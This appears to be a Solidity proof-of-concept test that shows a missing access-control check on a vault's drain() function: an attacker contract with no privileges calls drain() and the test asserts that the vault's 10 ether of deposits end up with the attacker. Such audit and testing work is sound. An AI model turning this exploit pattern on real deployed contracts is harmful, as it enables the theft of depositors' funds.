// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/AccessVault.sol";

/// @notice Non-owner attacker: no privileges, no owner key, just a call to drain().
contract VaultAttacker {
    AccessVault public immutable vault;

    constructor(address payable vaultAddress) {
        vault = AccessVault(vaultAddress);
    }

    function attack() external {
        // No access control on drain(): this call succeeds from any address.
        vault.drain();
    }

    receive() external payable {}
}

contract AccessControlPoC {
    AccessVault internal vault;
    uint256 internal constant DEPOSITS = 10 ether;

    function setUp() public {
        vault = new AccessVault();
        // Vault holds 10 ether of other users' deposits (the test acts as depositor).
        vault.deposit{value: DEPOSITS}();
    }

    function testNonOwnerDrainsVault() public {
        VaultAttacker attacker = new VaultAttacker(payable(address(vault)));
        uint256 startBalance = address(attacker).balance;

        // A plain non-owner calls the privileged function and succeeds.
        attacker.attack();

        // The attacker ends with more than it started with (it started with 0).
        assert(address(attacker).balance > startBalance);
        // And the vault is completely empty.
        assert(address(vault).balance == 0);
    }
}
